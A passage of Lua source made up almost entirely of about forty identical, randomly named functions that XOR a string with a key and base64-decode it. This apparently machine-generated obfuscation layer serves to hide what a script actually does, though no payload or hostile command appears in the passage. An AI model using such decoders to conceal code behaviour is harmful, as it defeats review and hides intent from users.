        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_cpuors(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_n_sxxy(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_oddohd(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_fzneua(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_jgnpzi(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_vcgbel(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_uufhvo(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec__h_wlq(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec__jorwc(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_npshma(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_wkquqc(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_jvzlzw(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_tpxbtj(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_bdwsoc(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_xh_jyr(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_vrwcqu(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_glckxl(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_zjckmk(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_yvhkjx(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ckyrpa(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_fdicui(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_owswod(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_fpdgkc(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_harzgq(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ulfsro(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_glyaap(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_wiuoua(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_uoitwy(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ambojx(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_oznh_g(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_borych(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_vwqrfv(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_vcrasz(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_vzddcj(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_pmhfnl(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_sjyexg(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_mmhlgq(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_vqauvm(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
